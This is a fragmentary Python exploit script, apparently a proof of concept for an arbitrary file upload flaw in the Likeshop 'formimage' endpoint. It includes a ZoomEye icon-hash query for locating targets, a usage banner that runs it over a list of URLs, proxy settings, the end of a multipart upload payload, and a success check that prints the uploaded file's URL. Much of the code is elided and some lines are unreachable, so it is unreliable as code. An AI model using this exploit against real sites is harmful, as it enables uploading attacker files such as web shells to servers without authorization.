...
# zoomeye:iconhash: "b2e68d0acf5b3117f88421799920ab98"
...
if len(sys.argv) != 2:
    ...
    print(
        '+ EXP: python3 Likeshop_Formimage_Uploadfile_poc.py url.txt                                             +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
...
------WebKitFormBoundaryJpMyThWnAxbcBBQc--"""
    try:
        ...
        if r.status_code==200 and "base_url" in r.text:
            dict_json=json.loads(r.text)
            
            print(url+" 上传文件地址为:" + dict_json['data']['url'])     
        else:
            return 0
            print (host+":false")
    except:
